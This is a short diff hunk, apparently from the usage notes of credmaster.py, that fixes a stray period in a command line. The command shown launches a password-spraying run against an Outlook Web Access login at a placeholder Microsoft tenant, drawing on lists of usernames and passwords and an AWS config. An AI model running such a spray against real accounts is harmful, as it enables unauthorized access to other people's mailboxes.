@@ -67,7 +67,7 @@ python3 credmaster.py -u "users.txt" \
 python3 credmaster.py -u "/root/target/users.txt" \
 -p pass.txt \
 --plugin owa \
---url "https://target.mail.onmicrosoft.com" \.
+--url "https://target.mail.onmicrosoft.com" \
 --config aws.config \
 -o "/root/target/OWA-credmaster-out"
 ```
